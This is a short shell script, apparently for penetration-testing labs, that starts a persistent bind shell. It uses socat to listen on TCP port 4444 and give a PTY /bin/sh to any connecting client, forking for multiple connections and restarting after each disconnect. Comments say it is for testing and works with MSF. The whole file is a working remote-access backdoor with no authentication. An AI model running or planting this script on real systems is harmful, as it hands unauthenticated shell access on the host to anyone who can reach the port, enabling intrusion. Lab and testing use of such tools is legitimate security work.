#!/bin/sh
# Simple bind shell for testing - restarts on disconnect
# Uses socat for reliable shell sessions

echo "[*] Starting bind shell on port 4444..."

# Loop forever, restarting shell on disconnect
while true; do
    # socat creates a PTY-based shell that works well with MSF
    # fork allows multiple connections
    socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane

    echo "[*] Connection closed, restarting listener..."
    sleep 1
done
